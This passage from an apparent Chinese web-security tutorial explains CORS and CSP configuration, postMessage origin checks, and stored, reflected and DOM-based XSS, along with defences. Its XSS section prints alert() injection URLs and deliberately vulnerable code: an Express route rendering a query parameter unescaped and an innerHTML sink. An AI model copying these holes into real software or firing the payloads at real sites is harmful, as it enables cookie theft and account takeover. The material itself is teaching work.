\u0026lt;/IfModule\u0026gt; Nginx 服务器 在 Nginx 配置文件中添加以下内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 server { location / { add_header \u0026#39;Access-Control-Allow-Origin\u0026#39; \u0026#39;http://example.com\u0026#39;; add_header \u0026#39;Access-Control-Allow-Methods\u0026#39; \u0026#39;GET, POST, PUT, DELETE\u0026#39;; add_header \u0026#39;Access-Control-Allow-Headers\u0026#39; \u0026#39;Content-Type\u0026#39;; add_header \u0026#39;Access-Control-Allow-Credentials\u0026#39; \u0026#39;true\u0026#39;; if ($request_method = \u0026#39;OPTIONS\u0026#39;) { add_header \u0026#39;Access-Control-Allow-Origin\u0026#39; \u0026#39;http://example.com\u0026#39;; add_header \u0026#39;Access-Control-Allow-Methods\u0026#39; \u0026#39;GET, POST, PUT, DELETE\u0026#39;; add_header \u0026#39;Access-Control-Allow-Headers\u0026#39; \u0026#39;Content-Type\u0026#39;; add_header \u0026#39;Access-Control-Allow-Credentials\u0026#39; \u0026#39;true\u0026#39;; return 204; } } } 总结\nCORS 是一种机制，允许浏览器安全地进行跨域请求，从而解决浏览器同源策略的限制问题。 通过设置 HTTP 响应头，CORS 允许服务器控制哪些请求可以访问其资源。 CORS 的正确实现能大幅提高前端与后端系统间的安全性和灵活性，确保跨域通信的安全性。 CSP **扩展：**CSP 具体是什么样的？在代码中如何体现？\n内容安全策略 (Content Security Policy, CSP) 用于提高网页安全性的机制，旨在防止常见的网络攻击，如跨站脚本 (XSS)、数据注入攻击等。CSP 通过限制网页加载的资源（如脚本、样式表、图片等）的来源，减少潜在攻击面的大小。\nCSP 的工作原理\nCSP 通过在 HTTP 响应头中添加策略声明，或者在 HTML 文档的 \u0026lt;meta\u0026gt; 标签中内嵌策略，来告知浏览器该页面允许加载的内容类型和来源。浏览器会根据这些策略来决定是否加载特定的资源或执行特定的脚本。\nCSP 的常见指令\n以下是一些常见的 CSP 指令：\ndefault-src：定义默认的内容源，如果没有为特定类型的资源指定源，它将使用此策略。 script-src：指定允许加载 JavaScript 代码的源。 style-src：指定允许加载 CSS 样式的源。 img-src：指定允许加载图像的源。 connect-src：指定允许的连接目标（如 AJAX 请求、WebSocket）。 font-src：指定允许加载字体的源。 object-src：指定允许加载插件的源（如 Flash）。 frame-src：指定允许嵌入框架的源（如 \u0026lt;iframe\u0026gt;）。 report-uri：指定浏览器在检测到策略违反时向哪里发送报告。 1. 在 HTTP 响应头中设置 CSP\n通常，在服务器端设置 CSP 是最常见和推荐的方式。\n示例 1：允许从自身 (self)、Google Analytics 和特定域名加载脚本，允许加载来自任何来源的图像。\n1 Content-Security-Policy: default-src \u0026#39;self\u0026#39;; script-src \u0026#39;self\u0026#39; https://www.google-analytics.com; img-src * 解释：\ndefault-src 'self'：默认资源来源是自身（同源）。 script-src 'self' https://www.google-analytics.com：仅允许从自身或 Google Analytics 加载 JavaScript。 img-src *：允许从任何来源加载图片。 在 HTML 文档中使用 \u0026lt;meta\u0026gt; 标签设置 CSP 在 HTML 的 \u0026lt;head\u0026gt; 部分使用 \u0026lt;meta\u0026gt; 标签内嵌 CSP 策略。这种方式适用于静态网页，或在无法控制 HTTP 头的情况下使用。\n示例 2：与上面 HTTP 头部示例相同的 CSP 设置。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;default-src \u0026#39;self\u0026#39;; script-src \u0026#39;self\u0026#39; https://www.google-analytics.com; img-src *;\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Example with CSP\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Hello, CSP!\u0026lt;/h1\u0026gt; \u0026lt;script src=\u0026#34;https://www.google-analytics.com/analytics.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; CSP 的详细策略及指令示例\n严格限制 JavaScript 和 CSS：\n1 Content-Security-Policy: script-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;; style-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39; 解释：仅允许加载来自同一源的脚本和样式，同时允许内联的 \u0026lt;script\u0026gt; 和 \u0026lt;style\u0026gt; 标签。'unsafe-inline' 使 CSP 较弱，需谨慎使用。\n只允许特定域名的 AJAX 请求：\n1 Content-Security-Policy: connect-src \u0026#39;self\u0026#39; https://api.example.com 解释：仅允许到自身和 api.example.com 的 AJAX 请求。\n报告策略违规：\n1 Content-Security-Policy: default-src \u0026#39;self\u0026#39;; report-uri /csp-violation-report-endpoint/ 解释：策略违规时，浏览器会发送报告到 /csp-violation-report-endpoint/。\nCSP 的最佳实践\n尽量避免使用 'unsafe-inline' 和 'unsafe-eval'：这些指令使 CSP 的效果变弱，允许内联脚本和 eval() 执行代码，容易受到攻击。 使用 nonce 或 hash 验证：为每个内联脚本分配唯一的 nonce 值，或使用哈希值来验证脚本的完整性。 逐步部署 CSP：可以从 Content-Security-Policy-Report-Only 头部开始，监控违规报告，逐步完善策略。 减少可信来源：尽可能地缩小允许加载资源的来源范围，以提高安全性。 在实现和使用内容安全策略（Content Security Policy, CSP）时，常见的一些错误会导致策略失效、误阻拦合法资源或者安全风险增加。以下是 CSP 常见错误及其详细说明：\n使用 'unsafe-inline' 和 'unsafe-eval' 错误描述：'unsafe-inline' 允许内联脚本（如 \u0026lt;script\u0026gt; 标签中的脚本或 style 属性中的样式）执行，'unsafe-eval' 允许使用 eval() 函数执行字符串代码。这两个指令会削弱 CSP 的安全性。 影响：攻击者可以注入内联脚本或使用 eval() 执行任意代码，这大大增加了 XSS 攻击的风险。 解决方法：尽量避免使用 'unsafe-inline' 和 'unsafe-eval'，改用 nonce 或 hash 来验证内联脚本的安全性。 1 Content-Security-Policy: script-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;; /* 这种写法不安全 */ 不使用 default-src 或未设置默认策略 错误描述：CSP 中缺少 default-src 指令或未设置明确的默认策略。 影响：如果没有定义 default-src，那么 CSP 不能提供一个全面的默认策略，浏览器在处理未明确设置的资源类型时行为不可控。 解决方法：始终使用 default-src 作为默认的策略，以便覆盖所有类型的资源加载限制。 1 Content-Security-Policy: script-src \u0026#39;self\u0026#39;; /* 缺少 default-src，导致其他资源（如图像、样式等）未被明确限制 */ 使用通配符 (*) 放宽限制 错误描述：使用通配符 * 来允许从任何来源加载资源。 影响：这使得 CSP 失去安全限制的效果，攻击者可以通过任意来源加载恶意资源。 解决方法：避免使用 *，尽量指定具体的域名和协议来源。 1 Content-Security-Policy: script-src *; /* 不安全的写法，允许任何来源的脚本加载 */ 不正确地使用 report-uri 或未启用报告 错误描述：未正确使用 report-uri 指令来监控 CSP 违规行为，或未启用报告模式。 影响：在 CSP 策略被绕过或未正确配置时，无法收到报告，从而错失修复漏洞的机会。 解决方法：在测试阶段，使用 Content-Security-Policy-Report-Only 来监控策略的效果，并确保 report-uri 指向一个有效的报告接收端点。 1 Content-Security-Policy: default-src \u0026#39;self\u0026#39;; report-uri /csp-report-endpoint; /* 确保 report-uri 指向有效端点 */ 忘记添加协议或域名不正确 错误描述：没有指定完整的协议（如 https:）或域名拼写错误。 影响：资源加载失败，页面功能受影响，甚至阻止合法的资源。 解决方法：确保指定完整的协议，并检查域名拼写。 1 Content-Security-Policy: script-src www.example.com; /* 应为 \u0026#39;https://www.example.com\u0026#39; */ 错误地使用多个 CSP 标头 错误描述：服务器发送多个 CSP 标头，它们可能会互相冲突或被浏览器忽略。 影响：浏览器只会应用第一个 CSP 头部，其他的将被忽略，可能导致不安全。 解决方法：仅使用一个 CSP 头部，确保其包含所有的策略。 忘记 self 来源或未配置必要的来源 错误描述：忘记使用 'self' 作为允许来源，或未包括必要的域名，导致阻止合法资源。 影响：浏览器会阻止加载合法的资源，导致网站功能不可用。 解决方法：在策略中包括 'self' 或必要的源域名。 1 Content-Security-Policy: script-src \u0026#39;self\u0026#39; https://apis.example.com; /* 允许自身和指定域名的脚本 */ 忽略资源类型的指令 错误描述：未为所有的资源类型（如脚本、样式、字体等）提供策略指令。 影响：默认的 default-src 可能会应用于所有资源类型，导致资源加载被意外阻止。 解决方法：为每种资源类型（如 script-src, style-src, img-src）提供明确的策略指令。 忽略 CSP 非支持特性 错误描述：使用了一些 CSP 版本较新的特性，但忽略了一些旧浏览器或特定浏览器不支持的特性。 影响：旧浏览器可能会忽略整个 CSP，导致页面安全性降低。 解决方法：检查浏览器的 CSP 支持情况，兼容不同版本或使用降级方案。 忽视 unsafe-hashes 和 unsafe-inline 的差异 错误描述：混淆了 unsafe-hashes 和 unsafe-inline 的使用，它们的用途和安全级别不同。 影响：在错误使用时会降低 CSP 的保护效果。 解决方法：理解和正确使用 CSP 关键字，尽量避免不必要的安全风险。 postMessage window.postMessage 是一个用于在不同窗口（包括 iframe、弹出窗口、跨域窗口）之间进行安全通信的 JavaScript 接口。它允许安全地传递数据，而不受同源策略的限制。\n使用场景\n跨域通信：当两个页面的源（协议、主机、端口）不同时，无法通过常规的 JavaScript 方式直接访问对方的内容。postMessage 允许在这种情况下安全地传递数据。 嵌套页面通信：用于 iframe 与父页面之间的通信。 弹窗通信：主页面和使用 window.open 打开的弹出窗口之间的通信。 代码示例\n以下是一个详细的代码示例，演示了如何使用 window.postMessage 在两个不同源的窗口之间进行通信。\n示例场景\n主页面 (index.html)：嵌入了一个 iframe，iframe 加载了一个不同源的网页。 子页面 (iframe.html)：加载在 iframe 中，可以与主页面进行通信。 代码实现\n主页面 (index.html) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Parent Page\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;主页面 (Parent Page)\u0026lt;/h1\u0026gt; \u0026lt;!-- 嵌入一个不同源的 iframe --\u0026gt; \u0026lt;iframe id=\u0026#34;myIframe\u0026#34; src=\u0026#34;https://example.com/iframe.html\u0026#34; width=\u0026#34;500\u0026#34; height=\u0026#34;300\u0026#34; \u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;button onclick=\u0026#34;sendMessage()\u0026#34;\u0026gt;向 iframe 发送消息\u0026lt;/button\u0026gt; \u0026lt;script\u0026gt; // 发送消息给 iframe function sendMessage() { const iframe = document.getElementById(\u0026#34;myIframe\u0026#34;); const message = { greeting: \u0026#34;Hello from parent\u0026#34; }; // 使用 postMessage 向 iframe 发送消息 iframe.contentWindow.postMessage(message, \u0026#34;https://example.com\u0026#34;); } // 监听来自 iframe 的消息 window.addEventListener(\u0026#34;message\u0026#34;, (event) =\u0026gt; { // 确认消息来源的安全性 if (event.origin !== \u0026#34;https://example.com\u0026#34;) { return; } console.log(\u0026#34;接收到来自 iframe 的消息:\u0026#34;, event.data); }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 子页面 (iframe.html) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Iframe Page\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;子页面 (Iframe Page)\u0026lt;/h1\u0026gt; \u0026lt;button onclick=\u0026#34;sendMessageToParent()\u0026#34;\u0026gt;向主页面发送消息\u0026lt;/button\u0026gt; \u0026lt;script\u0026gt; // 向主页面发送消息 function sendMessageToParent() { const message = { greeting: \u0026#34;Hello from iframe\u0026#34; }; // 使用 postMessage 向主页面发送消息 window.parent.postMessage(message, \u0026#34;http://localhost:8000\u0026#34;); } // 监听来自主页面的消息 window.addEventListener(\u0026#34;message\u0026#34;, (event) =\u0026gt; { // 确认消息来源的安全性 if (event.origin !== \u0026#34;http://localhost:8000\u0026#34;) { return; } console.log(\u0026#34;接收到来自主页面的消息:\u0026#34;, event.data); }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 代码说明\n发送消息： 主页面：使用 iframe.contentWindow.postMessage(message, targetOrigin) 向子页面发送消息。message 是要发送的数据，targetOrigin 是接收消息的页面的 URL。 子页面：使用 window.parent.postMessage(message, targetOrigin) 向父页面发送消息。 接收消息： 使用 window.addEventListener('message', callback) 监听消息事件。 event.origin：消息发送者的源（协议、主机、端口）。通过检查 event.origin 来验证消息来源的安全性。 event.data：消息内容，包含发送的对象。 安全性注意事项\n验证消息来源：在接收消息时，必须检查 event.origin 以确保消息来自可信的源。 使用特定的目标源：postMessage 的 targetOrigin 参数应设置为预期接收者的 URL，而不是 \u0026quot;*\u0026quot;，以避免将消息发送到意外的目标。 结论\nwindow.postMessage 提供了一种跨域安全通信的方式，非常适合需要在不同源的窗口或 iframe 之间交换数据的场景。使用时需要注意安全性验证，确保消息来源的可信性。\n问题：总结一下同源策略、CSP 和 CORS 之间的关系，这对于理解浏览器的安全策略至关重要。\n同源策略 (Same-Origin Policy)、内容安全策略 (Content Security Policy, CSP) 和 跨域资源共享 (Cross-Origin Resource Sharing, CORS) 是三个不同但相关的 Web 安全机制。它们都有助于保护用户数据和 Web 应用的安全，但它们的作用和工作方式各不相同。\n同源策略 (Same-Origin Policy) 同源策略是浏览器的一个核心安全机制，用于防止来自不同源（不同的域名、协议或端口）的资源相互访问。该策略主要限制以下操作：\nCookie、LocalStorage 和 SessionStorage 的访问：一个域名不能访问另一个域名的存储数据。 DOM 访问：一个域名不能通过 JavaScript 操作另一个域名的页面 DOM。 AJAX 请求：一个域名不能向另一个域名发出 AJAX 请求，除非目标域名明确允许。 同源策略的目标是防止跨站脚本 (XSS) 和跨站请求伪造 (CSRF) 攻击。\n内容安全策略 (Content Security Policy, CSP) 内容安全策略 (CSP) 是一种用来防止跨站脚本攻击 (XSS) 的安全机制。它允许网站运营者通过 HTTP 头部或 HTML 的 \u0026lt;meta\u0026gt; 标签指定资源的加载来源。CSP 能够控制以下内容：\n加载脚本的来源：script-src 指令可以指定允许从哪些源加载 JavaScript。 加载样式的来源：style-src 指令可以指定允许从哪些源加载 CSS。 图像和其他资源的来源：img-src, font-src 等指令可以指定允许从哪些源加载图像和字体等资源。 CSP 的作用是控制资源加载，以防止恶意脚本的执行，从而防止 XSS 攻击。\n跨域资源共享 (Cross-Origin Resource Sharing, CORS) 跨域资源共享 (CORS) 是一种机制，它允许浏览器向与页面来源不同的服务器发出请求。这种请求在通常情况下会被同源策略阻止。CORS 通过在 HTTP 响应头中设置适当的标头，让服务器明确允许哪些源的请求可以访问该服务器的资源。\nCORS 的作用是通过设置 HTTP 响应头，允许跨域的 AJAX 请求或资源共享，以实现不同源之间的安全通信。\n相互关系\n同源策略是基础安全机制，默认阻止跨域的请求和访问。 CSP 和 CORS 是在同源策略的基础上，提供的两种更细粒度的控制策略，它们针对不同类型的安全需求： CSP 主要控制页面加载资源的来源，防止 XSS 攻击。 CORS 允许跨域请求，但前提是服务器明确允许某些源访问其资源。 包含关系： CSP 和 CORS 并不包含彼此。设置 CSP 并不能替代 CORS，也不能用于控制跨域请求；相反，CSP 只能用于控制页面加载资源的来源（如脚本、样式、图像等），而不能控制是否允许跨域请求。 即使设置了 CSP，依然需要使用 CORS 来明确允许跨域请求。CSP 不能解决跨域访问的问题，因为 CSP 不涉及 AJAX 请求的跨域权限问题。 示例解释\n设置 CSP 后是否能向指定的其他域名发送请求？ 不能。设置 CSP 后，只能控制页面加载资源的来源（如哪些域名可以加载脚本、样式、图像等），不能允许或控制 AJAX 请求向其他域名发送请求。\n例如：如果你想从 https://example.com 的页面向 https://api.example.com 发起 AJAX 请求：\n1 Content-Security-Policy: script-src \u0026#39;self\u0026#39; https://api.example.com; /* 只允许从 api.example.com 加载脚本 */ 这种设置不会允许你通过 AJAX 访问 https://api.example.com，你仍然需要在目标服务器上配置 CORS。\n配置 CORS 的作用 配置 CORS 允许浏览器向其他域名发送请求，但只有目标服务器设置了适当的 CORS 头部（如 Access-Control-Allow-Origin），浏览器才会放行这些跨域请求。\n例如：在服务器端设置允许跨域访问：\n1 Access-Control-Allow-Origin: https://example.com 这样，来自 https://example.com 的页面可以通过 AJAX 或 Fetch API 向该服务器发出请求。\n关系总结\n同源策略 是基础安全机制，默认限制跨域请求和访问。 CSP 提供对资源加载来源的控制，以防止恶意内容的加载和 XSS 攻击。 CORS 允许跨域请求，但需要服务器明确声明允许哪些源访问。 CSP 和 CORS 是独立的机制，它们可以同时使用，但一个不能替代另一个。你需要根据具体的安全需求配置相应的策略。\n跨站脚本攻击（XSS） 为什么 Cookie 中有 HttpOnly 属性？\n默认页面中可以引用任意第三方资源，然后又引入 CSP 策略来加以限制；默认 XMLHttpRequest 和 Fetch 不能跨站请求资源，然后又通过 CORS 策略来支持其跨域。\n支持页面中的第三方资源引用和 CORS 也带来了很多安全问题，其中最典型的就是 XSS 攻击。\nXSS 攻击 XSS 全称是 Cross Site Scripting。为了与“CSS”区分开来，故简称 XSS。 “跨站脚本”。XSS 攻击是指黑客往 HTML 文件中或者 DOM 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。\n最开始这种攻击是通过跨域来实现的，所以叫“跨域脚本”。但是发展到现在，往 HTML 文件中注入恶意代码的方式越来越多了，所以是否跨域注入脚本已经不是唯一的注入手段了，但是 XSS 这个名字却一直保留至今。\n当页面被注入了恶意 JavaScript 脚本时，浏览器无法区分这些脚本是被恶意注入的还是正常的页面内容，所以恶意注入 JavaScript 脚本也拥有所有的脚本权限。\n如果页面被注入了恶意 JavaScript 脚本，恶意脚本都能做哪些事情？\n可以窃取 Cookie 信息。恶意 JavaScript 通过“document.cookie”获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给黑客自己的服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。 可以监听用户行为。恶意 JavaScript 使用“addEventListener”接口来监听键盘事件，比如可以获取用户输入的信用卡等信息，将其发送到恶意服务器。 可以通过修改 DOM伪造假的登录窗口，用来欺骗用户输入用户名和密码等信息。 可以在页面内生成浮窗广告，这些广告会严重地影响用户体验。 除了以上几种情况外，恶意脚本还能做很多其他的事情。总之，如果让页面插入了恶意脚本，那么就相当于把页面的隐私数据和行为完全暴露给黑客了。\n恶意脚本的注入方式 网站开发者应该尽可能地避免页面中被注入恶意脚本。注入恶意脚本的方式：\n存储型 XSS 攻击 存储型 XSS 攻击大致需要经过如下步骤：\n首先黑客利用站点漏洞将一段恶意 JavaScript 代码提交到网站的数据库中； 然后用户向网站请求包含了恶意 JavaScript 脚本的页面； 当用户浏览该页面的时候，恶意脚本就会将用户的 Cookie 信息等数据上传到黑客的服务器。 例子\n2015 年喜马拉雅就被曝出了存储型 XSS 漏洞。起因是在用户设置专辑名称时，服务器对关键字过滤不严格，比如可以将专辑名称设置为一段 JavaScript，如下图所示：\n当黑客将专辑名称设置为一段 JavaScript 代码并提交时，喜马拉雅的服务器会保存该段 JavaScript 代码到数据库中。然后当用户打开黑客设置的专辑时，这段代码就会在用户的页面里执行（如下图），这样就可以获取用户的 Cookie 等数据信息。\n当用户打开黑客设置的专辑页面时，服务器也会将这段恶意 JavaScript 代码返回给用户，因此这段恶意脚本就在用户的页面中执行了。\n恶意脚本可以通过 XMLHttpRequest 或者 Fetch 将用户的 Cookie 数据上传到黑客的服务器，如下图所示：\n黑客拿到了用户 Cookie 信息之后，就可以利用 Cookie 信息在其他机器上登录该用户的账号（如下图），并利用用户账号进行一些恶意操作。\n反射型 XSS 攻击 在反射型 XSS 攻击过程中，恶意 JavaScript 脚本属于用户发送给网站请求中的一部分，随后网站又把恶意 JavaScript 脚本返回给用户。当恶意 JavaScript 脚本在用户页面中被执行时，黑客就可以利用该脚本做一些恶意操作。\n实例代码：\n1 2 3 4 5 6 7 8 9 var express = require(\u0026#34;express\u0026#34;); var router = express.Router(); /* GET home page. */ router.get(\u0026#34;/\u0026#34;, function (req, res, next) { res.render(\u0026#34;index\u0026#34;, { title: \u0026#34;Express\u0026#34;, xss: req.query.xss }); }); module.exports = router; index.html\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;\u0026lt;%= title %\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/stylesheets/style.css\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;%= title %\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Welcome to \u0026lt;%= title %\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;div\u0026gt;\u0026lt;%- xss %\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 服务端的作用是：将 URL 中 xss 参数的内容显示在页面。当打开http://localhost:3000/?xss=\u0026lt;script\u0026gt;alert('你被xss攻击了')\u0026lt;/script\u0026gt;这段 URL 时，其结果如下图所示：\n用户将一段含有恶意代码的请求提交给 Web 服务器，Web 服务器接收到请求时，又将恶意代码反射给了浏览器端，这就是反射型 XSS 攻击。在现实生活中，恶意链接的原理（所以可以查看连接的格式是否包含脚本）。\nWeb 服务器不会存储反射型 XSS 攻击的恶意脚本，这是和存储型 XSS 攻击不同的地方。\n反射型 XSS 攻击的原理 攻击者构造恶意 URL：攻击者将恶意 JavaScript 代码作为参数注入到 URL 中。例如：\n1 https://example.com/search?q=\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;);\u0026lt;/script\u0026gt; 在这个 URL 中，q 参数的值是恶意的 \u0026lt;script\u0026gt;alert('XSS');\u0026lt;/script\u0026gt;。\n诱导用户访问恶意 URL：攻击者通过电子邮件、社交媒体、钓鱼网站等手段诱导用户点击该恶意 URL。\n受害者访问恶意 URL：当受害者访问这个恶意 URL 时，服务器会将 URL 中的参数（包括恶意脚本）反射（返回）到响应页面中，并在浏览器中执行。\n恶意脚本执行：由于恶意脚本被插入到了网页的响应中，浏览器会将其当成正常的 HTML 内容解析并执行。这样，攻击者的恶意代码就会在受害者的浏览器中运行，可能会窃取用户的 Cookie、敏感信息，或执行其他恶意操作。\n反射型 XSS 的特点 即时性：攻击发生在用户点击恶意链接并访问时。与存储型 XSS 不同，攻击代码不会长期存储在服务器上，而是立即反射并执行。 需要诱导用户：反射型 XSS 依赖于攻击者诱导用户访问恶意链接，如果用户不访问或点击，该攻击就不会发生。 如何防御反射型 XSS 攻击 对用户输入进行严格的输入验证和输出编码：\n输入验证：拒绝或过滤掉含有潜在危险的字符（如 \u0026lt;, \u0026gt;, ', \u0026quot; 等）的输入。\n输出编码：将所有用户输入在输出到 HTML 内容前进行适当的编码，例如使用 HTML 实体编码，将 \u0026lt; 编码为 \u0026amp;lt;，\u0026gt; 编码为 \u0026amp;gt; 等。\n使用 HTTP 安全头：\n使用 Content-Security-Policy (CSP) HTTP 头，限制浏览器可以执行的脚本的来源，阻止不被信任的脚本执行。\n1 Content-Security-Policy: default-src \u0026#39;self\u0026#39;; script-src \u0026#39;self\u0026#39; 对 URL 参数进行编码和转义：\n在处理 URL 参数时，确保对所有输出到页面的参数进行编码和转义。 避免在响应中直接输出用户输入的内容：\n如果可能，避免在 HTML 响应中直接使用用户提供的输入。对需要展示的用户输入内容进行清理或替换。 使用现代的 Web 开发框架：\n使用诸如 React、Vue.js 或 Angular 这类现代框架，它们默认会对用户输入进行转义和过滤，以防止 XSS 攻击。 利用内容安全策略 (CSP)：\n设置合适的内容安全策略头部，指定可信任的脚本来源，从而防止执行未知来源的脚本。 反射型 XSS 生效的前提是不是：服务器的对应接口能将用户提交的内容原样返回给客户端吗？\n是的，反射型 XSS 攻击生效的前提之一是：服务器的某个接口或页面将用户提交的内容（例如通过 URL 参数或表单提交的数据）未经适当的过滤或转义，原样返回给客户端。这种情况下，恶意输入会直接反射（echo）到页面的响应中，导致恶意代码在用户浏览器中执行。\n反射型 XSS 生效的条件 用户输入未经过滤或转义：服务器端代码未对用户输入进行适当的过滤或转义。例如，当用户提交数据时，服务器直接将数据插入到页面的响应中，而没有清理或编码潜在的危险字符。 服务器响应中包含用户提交的数据：用户的输入被直接插入到 HTML 内容中（例如作为文本节点、HTML 属性值、JavaScript 代码等），且浏览器会对这些数据进行解析和渲染。 恶意代码通过用户输入传递：攻击者可以构造包含恶意代码的请求（如 URL），诱导用户点击。当用户点击恶意链接时，服务器会返回一个包含恶意脚本的响应。 示例：反射型 XSS 的典型场景 假设一个网站 example.com 有一个搜索功能，用户可以在 URL 中输入搜索词，如：\n1 https://example.com/search?q=javascript 服务器将用户输入的 q 参数原样插入到 HTML 中返回：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Search Results\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Search Results for: javascript\u0026lt;/h1\u0026gt; \u0026lt;!-- 其他内容 --\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 如果攻击者构造了一个恶意的 URL，如：\n1 https://example.com/search?q=\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;);\u0026lt;/script\u0026gt; 当用户点击这个链接时，服务器没有对 q 参数的内容进行任何过滤或转义，会直接将其插入响应中：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Search Results\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt; Search Results for: \u0026lt;script\u0026gt; alert(\u0026#34;XSS\u0026#34;); \u0026lt;/script\u0026gt; \u0026lt;/h1\u0026gt; \u0026lt;!-- 其他内容 --\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 此时，浏览器会解析并执行 \u0026lt;script\u0026gt;alert('XSS');\u0026lt;/script\u0026gt;，导致弹出 XSS 警告框。这就是反射型 XSS 的攻击生效过程。\n基于 DOM 的 XSS 攻击 基于 DOM 的 XSS 攻击（DOM-based XSS） 是一种在客户端（浏览器）上发生的跨站脚本攻击类型，它通过操纵 DOM（文档对象模型）来执行恶意代码。与反射型和存储型 XSS 不同，DOM 型 XSS 不涉及服务器端的参与，攻击者直接在客户端修改页面的内容或行为。\n具体来讲，黑客通过各种手段将恶意脚本注入用户的页面中，比如通过网络劫持在页面传输过程中修改 HTML 页面的内容，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件（木马）来劫持的，它们的共同点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据。\n在 DOM 型 XSS 攻击中，恶意脚本不经过服务器返回，而是直接在客户端通过 JavaScript 操作 DOM 元素注入或执行。通常发生在以下情况下：\n页面从 URL、location.hash、document.cookie、localStorage 等处读取数据并使用 JavaScript 将其插入到页面的 DOM 中，但未进行适当的安全处理。 JavaScript 动态修改页面内容（如 innerHTML、document.write 等）时，使用了用户可控的数据。 DOM 型 XSS 的典型例子\n假设一个网站允许用户在 URL 中传递参数来控制显示的内容，并直接使用这些参数更新页面内容，而没有进行适当的转义和过滤。\n示例 1：读取 URL 参数导致的 DOM 型 XSS\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Welcome!\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;message\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; // 从 URL 中获取 \u0026#39;msg\u0026#39; 参数的值 const params = new URLSearchParams(window.location.search); const message = params.get(\u0026#34;msg\u0026#34;); // 直接将用户输入的参数插入到页面中，未经过任何过滤或转义 document.getElementById(\u0026#34;message\u0026#34;).innerHTML = message; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; 攻击者可以构造一个恶意 URL，将恶意 JavaScript 代码注入 msg 参数中：\n1 http://example.com?msg=\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;);\u0026lt;/script\u0026gt; 当用户访问这个 URL 时，浏览器将执行如下代码：\n1 2 3 4 5 \u0026lt;div id=\u0026#34;message\u0026#34;\u0026gt; \u0026lt;script\u0026gt; alert(\u0026#34;XSS\u0026#34;); \u0026lt;/script\u0026gt; \u0026lt;/div\u0026gt; 